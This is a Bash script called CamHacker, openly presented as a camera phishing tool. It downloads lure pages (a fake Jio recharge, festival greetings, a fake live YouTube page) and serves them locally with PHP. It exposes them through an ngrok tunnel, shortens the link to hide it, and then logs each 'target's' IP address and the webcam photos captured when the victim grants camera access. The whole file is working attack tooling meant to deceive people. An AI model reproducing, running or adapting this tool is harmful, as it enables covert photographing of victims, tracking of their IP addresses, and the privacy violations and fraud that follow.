#!/bin/bash

# CamHacker
# Description: CamHacker is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
# Author     : KasRoudra
# Github     : https://github.com/KasRoudra
# Email      : kasroudrakrd@gmail.com
# Credits    : Noob-Hackers, TechChipNet, LinuxChoice
# Date       : 5-09-2021
# Language   : Shell
# Portable File
# If you copy, consider giving credit! We keep our code open source to help others

black="\033[1;30m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
purple="\033[1;35m"
cyan="\033[1;36m"
violate="\033[1;37m"
white="\033[0;37m"
nc="\033[00m"

info="${cyan}[${white}+${cyan}] ${yellow}"
ask="${cyan}[${white}?${cyan}] ${violate}"
error="${cyan}[${white}!${cyan}] ${red}"
success="${cyan}[${white}√${cyan}] ${green}"

cwd=`pwd`

if [[ -d /data/data/com.termux/files/home ]]; then
termux-fix-shebang ch.sh
termux=true
else
termux=false
fi
if $termux; then
if ! [ -d /sdcard/Pictures ]; then
cd /sdcard && mkdir Pictures
fi
export FOL="/sdcard/Pictures"
else
export FOL="$cwd"
fi

logo="
${green}  ____                _   _            _
${red} / ___|__ _ _ __ ___ | | | | __ _  ___| | _____ _ __
${cyan}| |   / _' | '_ ' _ \| |_| |/ _' |/ __| |/ / _ \ '__|
${purple}| |__| (_| | | | | | |  _  | (_| | (__|   <  __/ |
${yellow} \____\__,_|_| |_| |_|_| |_|\__,_|\___|_|\_\___|_|
${blue}                                      [By KasRoudra]
"

killer() {
if [ `pidof php > /dev/null 2>&1` ]; then
    killall php
fi
if [ `pidof ngrok > /dev/null 2>&1` ]; then
    killall ngrok
fi
if [ `pidof curl > /dev/null 2>&1` ]; then
    killall curl
fi
if [ `pidof wget > /dev/null 2>&1` ]; then
    killall wget
fi
if [ `pidof unzip > /dev/null 2>&1` ]; then
    killall unzip
fi
}
netcheck() {
    while true; do
        wget --spider --quiet https://github.com
        if [ "$?" != 0 ]; then
            echo -e "${error}No internet!\007\n"
            sleep 2
        else
            break
        fi
    done
}

stty -echoctl
trap "echo -e '${success}Thanks for using!\n'; exit" 2

if ! [ `command -v php` ]; then
    echo -e "${info}Installing php...."
    apt update && apt upgrade -y
    apt install php -y
fi
if ! [ `command -v curl` ]; then
    echo -e "${info}Installing curl...."
    apt install curl -y
fi
if ! [ `command -v unzip` ]; then
    echo -e "${info}Installing unzip...."
    apt install unzip -y
fi
if ! [ `command -v wget` ]; then
    echo -e "${info}Installing wget...."
    apt install wget -y
fi
if ! [ `command -v php` ]; then
    echo -e "${error}PHP cannot be installed!\007\n"
    exit 1
fi
if ! [ `command -v curl` ]; then
    echo -e "${error}Curl cannot be installed!\007\n"
    exit 1
fi
if ! [ `command -v unzip` ]; then
    echo -e "${error}Unzip cannot be installed!\007\n"
    exit 1
fi
if ! [ `command -v wget` ]; then
    echo -e "${error}Wget cannot be installed!\007\n"
    exit 1
fi
if [ `pidof php > /dev/null 2>&1` ]; then
    echo -e "${error}Previous php cannot be closed. Restart terminal!\007\n"
    killer; exit 1
fi
if [ `pidof ngrok > /dev/null 2>&1` ]; then
    echo -e "${error}Previous ngrok cannot be closed. Restart terminal!\007\n"
    killer; exit 1
fi

if $termux; then
    path=`pwd`
    if echo "$path" | grep -q "home"; then
        printf ""
    else
        echo -e "${error}Invalid directory. Run from home!\007\n"
        killer; exit 1
    fi
fi
if ! [[ -f $HOME/.ngrokfolder/ngrok ]]; then
    p=`uname -m`
    while true; do
        echo -e "\n${info}Downloading ngrok!\n"
        netcheck
        if echo "$p" | grep -q "aarch64"; then
            if [ -e ngrok-stable-linux-arm64.tgz ];then
                rm -rf ngrok-stable-linux-arm64.tgz
            fi
            wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz"
            tar -zxf ngrok-stable-linux-arm64.tgz
            rm -rf ngrok-stable-linux-arm64.tgz
            break
        elif echo "$p" | grep -q "arm"; then
            if [ -e ngrok-stable-linux-arm.zip ];then
                rm -rf ngrok-stable-linux-arm.zip
            fi        
            wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm.zip"
            unzip ngrok-stable-linux-arm.zip
            rm -rf ngrok-stable-linux-arm.zip
            break
        elif echo "$p" | grep -q "x86_64"; then
            if [ -e ngrok-stable-linux-amd64.zip ];then
                rm -rf ngrok-stable-linux-amd64.zip
            fi        
            wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-amd64.zip"
            unzip ngrok-stable-linux-amd64.zip
            rm -rf ngrok-stable-linux-amd64.zip
            break
        else
            if [ -e ngrok-stable-linux-386.zip ];then
                rm -rf ngrok-stable-linux-386.zip
            fi      
            wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-386.zip"
            unzip ngrok-stable-linux-386.zip
            rm -rf ngrok-stable-linux-386.zip
            break
        fi
    done
    if ! [[ -d $HOME/.ngrokfolder ]]; then
        cd $HOME && mkdir .ngrokfolder
    fi
    sleep 1
    cd $cwd
    mv -f ngrok $HOME/.ngrokfolder
    chmod +x $HOME/.ngrokfolder/ngrok
fi
while true; do
clear
echo -e "$logo"
sleep 1
echo -e "${ask}Choose a option:

${cyan}[${white}1${cyan}] ${yellow}Jio Recharge
${cyan}[${white}2${cyan}] ${yellow}Festival
${cyan}[${white}3${cyan}] ${yellow}Live Youtube
${cyan}[${white}4${cyan}] ${yellow}Change Image Directory (current: ${red}${FOL} ${yellow})
${cyan}[${white}0${cyan}] ${yellow}Exit
${cyan}[${white}x${cyan}] ${yellow}About${blue}
"
sleep 1
printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
read option
    if echo $option | grep -q "1"; then
        dir="jio"
        break
    elif echo $option | grep -q "2"; then
        dir="fest"
        printf "\n${ask}Enter festival name:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
        read fest_name
        if [ -z $fest_name ]; then
            echo -e "\n${error}Invalid input!\n\007"
            sleep 1
        else
            fest_name="${fest_name//[[:space:]]/}"
            break
        fi
    elif echo $option | grep -q "3"; then
        dir="live"
        printf "\n${ask}Enter youtube video ID:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
        read vid_id
        if [ -z $vid_id ]; then
            echo -e "\n${error}Invalid input!\n\007"
            sleep 1
        else
            break
        fi
    elif echo $option | grep -q "4"; then
        printf "\n${ask}Enter Directory:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
        read dire
        if ! [ -d $dire ]; then
            echo -e "\n${error}Invalid directory!\n\007"
            sleep 1
        else
            export FOL="$dire"
            echo -e "\n${success}Directory changed succesfully!\n"
            sleep 1
        fi
    elif echo $option | grep -q "0"; then   
        exit 0
    elif echo $option | grep -q "x"; then
        clear
        echo -e "$logo"
        echo -e "$red[ToolName]  ${cyan}  :[CamHacker]
$red[Version]    ${cyan} :[1.0]
$red[Description]${cyan} :[Camera Phishing tool]
$red[Author]     ${cyan} :[KasRoudra]
$red[Github]     ${cyan} :[https://github.com/KasRoudra] 
$red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
$red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
read about
    else
        echo -e "\n${error}Invalid input!\007"
        sleep 1
    fi
done
cd $cwd
if [ -e websites.zip ];then
unzip websites.zip > /dev/null 2>&1
rm -rf websites.zip
fi
if ! [ -d $dir ];then
mkdir $dir
cd $dir
netcheck
wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/${dir}.zip"
unzip ${dir}.zip > /dev/null 2>&1
rm -rf ${dir}.zip
else
cd $dir
fi
if $termux; then
    echo -e "\n${info}If you haven't enabled hotspot, please enable it!\n"
    sleep 2
fi
sleep 1

echo -e "${info}Starting php server at localhost:7777....\n"
netcheck
php -S 127.0.0.1:7777 > /dev/null 2>&1 &
sleep 2
echo -e "${info}Starting ngrok at same address......\n"
netcheck
cd $HOME/.ngrokfolder && ./ngrok http 127.0.0.1:7777 > /dev/null 2>&1 &
sleep 1
n=0
while true; do
    checkngrok=$(curl -s http://127.0.0.1:4040/api/tunnels)
    if echo "$checkngrok" | grep -q "ngrok"; then
        echo -e "${success}Ngrok started succesfully!\n"
        break
    elif (( $n == 7 )) ; then
        echo -e "${error}Ngrok couldn't start!\n\007"
        killer; exit 1
    else
        sleep 2
    fi
((n++))
done
sleep 1
ngrokurl=`curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p'`
if ! [ `echo $ngrokurl | grep -q "http"` ]; then
    if ! (echo $ngrokurl | grep -q "https"); then
         ngrokurl="https://${ngrokurl}"
    else
         ngrokurl="http://${ngrokurl}"
    fi
fi
while true; do
    if echo $option | grep -q "1"; then
        sed 's+forwarding_link+'$ngrokurl'+g' grabcam.html > index2.html
        sed 's+forwarding_link+'$ngrokurl'+g' template.php > index.php
        break
    elif echo $option | grep -q "2"; then
        sed 's+forwarding_link+'$send_link'+g' template.php > index.php
        sed 's+forwarding_link+'$ngrokurl'+g' festivalwishes.html > index3.html
        sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
        rm -rf index3.html
        break
    elif echo $option | grep -q "3"; then
        sed 's+forwarding_link+'$ngrokurl'+g' template.php > index.php
        sed 's+forwarding_link+'$ngrokurl'+g' LiveYTTV.html > index3.html
        sed 's+live_yt_tv+'$vid_id'+g' index3.html > index2.html
        rm -rf index3.html
        break
    fi
done
sleep 1
status=$(curl -s --head -w %{http_code} 127.0.0.1:7777 -o /dev/null)
if echo "$status" | grep -q "404";then
    echo -e "${error}PHP couldn't start!\n\007"
    killer; exit 1
else
    echo -e "${success}PHP started succesfully!\n"
fi
sleep 1
if echo "$ngrokurl" | grep -q "ngrok"; then
    echo -e "${info}Your urls are: \n"
    sleep 1
    echo -e "${success}URL 1 > ${ngrokurl}\n"
else
    echo -e "${error}Ngrok url error!\n\007"
    killer; exit 1
fi
sleep 1
masked=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${ngrokurl})
if ! [[ -z $masked ]]; then
    echo -e "${success}URL 2 > ${masked}\n"
else
    printf ""
fi
sleep 1
rm -rf ip.txt
echo -e "${info}Waiting for target. ${cyan}Press ${red}Ctrl + C ${cyan}to exit...\n"
while true; do
    if [[ -e "ip.txt" ]]; then
        echo -e "\007${success}Target opened the link!\n"
        ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
        echo -e "${info}IP:${green} $ip \n"
        cat ip.txt >> $cwd/ips.txt
        rm -rf ip.txt
    fi
    sleep 0.5
    if [[ -e "log.txt" ]]; then
        echo -e "\007${success}Image downloaded! Check directory!\n"
        file=`ls | grep png`
        mv -f $file $FOL
        rm -rf log.txt
    fi
    sleep 0.5
done 
